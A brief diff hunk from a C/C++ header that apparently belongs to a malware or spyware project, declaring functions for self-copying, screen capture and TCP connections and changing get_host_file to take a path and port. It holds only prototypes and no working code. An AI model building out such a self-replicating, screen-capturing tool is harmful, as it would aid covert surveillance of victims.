@@ -37,4 +37,4 @@ void copy();
 void copyitself(const char *s);
 int ScreenCapture(const char* fname);
 void tcpconnect(const char *addr,const char* port);
-bool get_host_file();
+bool get_host_file(const wchar_t* p, int por);
